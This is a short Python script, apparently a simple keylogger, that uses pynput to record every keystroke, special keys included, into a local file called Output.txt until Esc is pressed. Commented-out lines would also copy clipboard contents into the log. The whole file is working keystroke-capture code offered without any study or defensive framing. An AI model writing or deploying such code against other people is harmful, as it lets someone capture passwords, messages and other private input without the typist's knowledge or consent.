import xlwt
from pynput import keyboard
from pynput import mouse
#import win32clipboard

def on_press(key):
    try:
        text_file = open("Output.txt", "a")
        text_file.write('{0}'.format(key.char))
        text_file.close()
    except AttributeError:
        text_file = open("Output.txt", "a")
        if (str('  {0}  '.format(key))) == "  Key.space  ": # don't save key.space that's annoying
            text_file.write(' '.format(key))
        if ('  {0}  '.format(key))!= "  Key.space  ": # if it isn't the space key list it
            text_file.write('  {0}  '.format(key))
            #win32clipboard.OpenClipboard()
            #data = win32clipboard.GetClipboardData()
 #           win32clipboard.CloseClipboard()
            #text_file.write("\n \n [CLIPBOARD DATA = "+data+"] \n \n")
            #print(" [CLIPBOARD DATA = "+data+"] ")
        text_file.close()

def on_release(key):    
    if key == keyboard.Key.esc:      
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()